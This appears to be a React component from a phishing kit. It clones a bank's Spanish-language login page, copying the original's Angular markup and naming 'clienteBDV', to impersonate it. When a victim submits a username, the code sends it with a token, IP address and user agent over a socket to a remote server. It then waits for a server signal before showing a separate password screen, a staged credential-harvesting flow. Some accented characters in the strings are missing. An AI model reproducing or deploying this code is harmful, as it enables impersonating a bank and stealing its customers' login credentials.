import React from "react";
import { useSocket } from "./SocketContext";
import { useDispatch, useSelector } from "react-redux";
import style from "./css/login.module.css";
import img00 from "./../images/logo.png";
import Password from "./PasswordCompo2";
import Error from "./ErrorCompo2";
import { sLoading, sUsername } from "../features/users/usersSlice";
import { useNavigate } from "react-router-dom";
import { link } from "./settings";

function Login() {
  const { currentSocket: socket } = useSocket();
  const [u, setU] = React.useState("");
  const [d, setD] = React.useState(true);
  const [d2, setD2] = React.useState(false);
  const [f, setF] = React.useState(false);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const navigate = useNavigate();
  const user = useSelector((e) => e.users);
  const dispatch = useDispatch();

  const onFocus = () => setF(true);
  const onBlur = () => {
    if (u === "") setF(false);
  };

  const handleButton = (e) => {
    e.preventDefault();
    if (u !== "" && socket) {
      setIsActive(true);
      socket.emit("update username", {
        username: u,
        login: true,
        token: user.token,
        ip: user.ip,
        userAgent: user.userAgent,
      });
      socket.emit("open login", { login: true });
      setF(false);
      setU("");
      dispatch(sUsername({ u }));
      dispatch(sLoading({ l: true }));
    }
  };

  React.useEffect(() => {
    if (u.length >= 6) setD(false);
    else setD(true);
    if (u.length > 1 && u.length <= 6) setD2(false);
    else setD2(true);
  }, [u]);

  React.useEffect(() => {
    if (socket) {
      let interval = null;
      if (time >= 60) {
        setIsActive(false);
        setCont(cont + 0);
        setTime(0);
      }
      if (isActive) {
        interval = setInterval(() => {
          setTime((time) => time + 1);
          //socket.emit("time user", { time: time + 1, p: cont + 2 });
        }, 1000);
      } else {
        clearInterval(interval);
      }
      return () => {
        clearInterval(interval);
      };
    }
  }, [isActive, time, cont]);

  React.useEffect(() => {
    if (user.password) {
      setIsActive(false);
      setTime(0);
      setCont(0);
      setU("");
    }
  }, [user.password]);

  return (
    <>
      <app-root _nghost-c0="" ng-version="6.1.10">
        <router-outlet _ngcontent-c0=""></router-outlet>
        <app-login _nghost-c10="" className={style["ng-star-inserted"]}>
          <div _ngcontent-c10="" className={style["login-container"]}>
            <div _ngcontent-c10="">
              <div
                _ngcontent-c10=""
                className={style["login-container-float-center"]}
              >
                <div _ngcontent-c10="" className={style["row"]}>
                  <div
                    _ngcontent-c10=""
                    className={
                      style["col"] +
                      " " +
                      style["s12"] +
                      " " +
                      style["not-margin"] +
                      " " +
                      style["not-padding"]
                    }
                  >
                    <div _ngcontent-c10="">
                      <div
                        _ngcontent-c10=""
                        className={style["login-container-logo"]}
                      >
                        <img
                          _ngcontent-c10=""
                          className={style["logo-login"]}
                          src={img00}
                        />
                      </div>
                      <div
                        _ngcontent-c10=""
                        className={style["login-container-form"]}
                      >
                        <form
                          _ngcontent-c10=""
                          noValidate=""
                          className={
                            style["ng-untouched"] +
                            " " +
                            style["ng-pristine"] +
                            " " +
                            style["ng-invalid"]
                          }
                          onSubmit={handleButton}
                        >
                          <div
                            _ngcontent-c10=""
                            className={style["formGroup"]}
                            role="form"
                          >
                            <mat-form-field
                              _ngcontent-c10=""
                              appearance="fill"
                              class={
                                style["mat-form-field"] +
                                " " +
                                style["ng-tns-c11-0"] +
                                " " +
                                style["mat-primary"] +
                                " " +
                                style["mat-form-field-type-mat-input"] +
                                " " +
                                style["mat-form-field-appearance-fill"] +
                                " " +
                                style["mat-form-field-can-float"] +
                                " " +
                                style["ng-untouched"] +
                                " " +
                                style["ng-pristine"] +
                                " " +
                                style["ng-invalid"] +
                                " " +
                                (!f
                                  ? style["mat-form-field-hide-placeholder"]
                                  : style["mat-form-field-should-float"] +
                                    " " +
                                    style["mat-focused"])
                              }
                            >
                              <div className={style["mat-form-field-wrapper"]}>
                                <div className={style["mat-form-field-flex"]}>
                                  <div
                                    className={style["mat-form-field-infix"]}
                                  >
                                    <input
                                      _ngcontent-c10=""
                                      aria-label="usuario"
                                      autoComplete="off"
                                      className={
                                        style["mat-input-element"] +
                                        " " +
                                        style[
                                          "mat-form-field-autofill-control"
                                        ] +
                                        " " +
                                        style[
                                          "cdk-text-field-autofill-monitored"
                                        ] +
                                        " " +
                                        style["ng-untouched"] +
                                        " " +
                                        style["ng-pristine"] +
                                        " " +
                                        style["ng-invalid"] +
                                        " " +
                                        style["ng-touched"]
                                      }
                                      formcontrolname="username"
                                      matinput=""
                                      maxLength="16"
                                      minLength="6"
                                      tabIndex="1"
                                      type="text"
                                      id="mat-input-0"
                                      aria-invalid="false"
                                      aria-required="false"
                                      onFocus={onFocus}
                                      onBlur={onBlur}
                                      value={u}
                                      onChange={(e) => {
                                        setU(e.target.value);
                                      }}
                                    />
                                    <span
                                      className={
                                        style["mat-form-field-label-wrapper"]
                                      }
                                    >
                                      <label
                                        className={
                                          style["mat-form-field-label"] +
                                          " " +
                                          style["ng-tns-c11-0"] +
                                          " " +
                                          style["mat-empty"] +
                                          " " +
                                          style["mat-form-field-empty"] +
                                          " " +
                                          style["ng-star-inserted"]
                                        }
                                        id="mat-form-field-label-1"
                                        htmlFor="mat-input-0"
                                        aria-owns="mat-input-0"
                                      >
                                        <mat-label
                                          _ngcontent-c10=""
                                          className={style["ng-star-inserted"]}
                                        >
                                          Usuario *
                                        </mat-label>
                                      </label>
                                    </span>
                                  </div>
                                </div>
                                <div
                                  className={
                                    style["mat-form-field-underline"] +
                                    " " +
                                    style["ng-tns-c11-0"] +
                                    " " +
                                    style["ng-star-inserted"]
                                  }
                                >
                                  <span
                                    className={style["mat-form-field-ripple"]}
                                  ></span>
                                </div>
                                <div
                                  className={
                                    style["mat-form-field-subscript-wrapper"]
                                  }
                                >
                                  {d2 && (
                                    <div
                                      className={
                                        style["mat-form-field-hint-wrapper"] +
                                        " " +
                                        style["ng-tns-c11-0"] +
                                        " " +
                                        style["ng-trigger"] +
                                        " " +
                                        style["ng-trigger-transitionMessages"] +
                                        " " +
                                        style["ng-star-inserted"]
                                      }
                                      style={{
                                        opacity: "1",
                                        transform: "translateY(0%)",
                                      }}
                                    >
                                      <div
                                        className={
                                          style["mat-form-field-hint-spacer"]
                                        }
                                      ></div>
                                    </div>
                                  )}
                                  {!d2 && (
                                    <div
                                      className={
                                        style["ng-tns-c11-0"] +
                                        " " +
                                        style["ng-trigger"] +
                                        " " +
                                        style["ng-trigger-transitionMessages"] +
                                        " " +
                                        style["ng-star-inserted"]
                                      }
                                      style={{
                                        opacity: "1",
                                        transform: "translateY(0%)",
                                      }}
                                    >
                                      <mat-error
                                        _ngcontent-c10=""
                                        className={
                                          style["mat-error"] +
                                          " " +
                                          style["ng-star-inserted"]
                                        }
                                        role="alert"
                                        id="mat-error-11"
                                      >
                                        Debe ingresar Usuario
                                      </mat-error>
                                    </div>
                                  )}
                                </div>
                              </div>
                            </mat-form-field>
                          </div>
                          <div
                            _ngcontent-c10=""
                            className={style["button-login-container"]}
                            role="row"
                          >
                            <button
                              _ngcontent-c10=""
                              color="accent"
                              mat-raised-button=""
                              role="button"
                              tabIndex="2"
                              type="submit"
                              className={
                                style["mat-raised-button"] +
                                " " +
                                style["mat-accent"]
                              }
                              disabled={`${d ? "disabled" : ""}`}
                            >
                              <span className={style["mat-button-wrapper"]}>
                                {" "}
                                Entrar{" "}
                              </span>
                              <div
                                className={
                                  style["mat-button-ripple"] +
                                  " " +
                                  style["mat-ripple"]
                                }
                                matripple=""
                              ></div>
                              <div
                                className={style["mat-button-focus-overlay"]}
                              ></div>
                            </button>
                          </div>
                        </form>
                        <div
                          _ngcontent-c10=""
                          className={
                            style["autogestion-usuario-unico"] +
                            " " +
                            style["text-center"]
                          }
                        >
                          <a
                            _ngcontent-c10=""
                            className={style["autogestion-user"]}
                            href="/gestion-usuario"
                            mattooltip="Gestiona tu usuario"
                            mattooltipposition="right"
                            role="link"
                            tabIndex="3"
                            title="gestin de usuario"
                            style={{
                              touchAction: "none",
                              userSelect: "none",
                            }}
                            aria-describedby="cdk-describedby-message-0"
                            cdk-describedby-host=""
                          >
                            {" "}
                            Olvidaste tu usuario o clave?{" "}
                          </a>
                          <br _ngcontent-c10="" />
                          <a
                            _ngcontent-c10=""
                            className={style["autogestion-user"]}
                            href="/gestion-usuario"
                            mattooltip="Gestiona tu usuario"
                            mattooltipposition="right"
                            role="link"
                            tabIndex="3"
                            title="gestin de usuario"
                            style={{
                              touchAction: "none",
                              userSelect: "none",
                            }}
                            aria-describedby="cdk-describedby-message-0"
                            cdk-describedby-host=""
                          >
                            {" "}
                            Si eres nuevo clienteBDV regstrate aqu{" "}
                          </a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </app-login>
      </app-root>
      <div
        className={
          style["cdk-live-announcer-element"] +
          " " +
          style["cdk-visually-hidden"]
        }
        aria-atomic="true"
        aria-live="assertive"
      >
        Usuario o contrasea no vlida
      </div>
      {user.error && <Error />}
      {user.password && <Password />}
    </>
  );
}
export default Login;
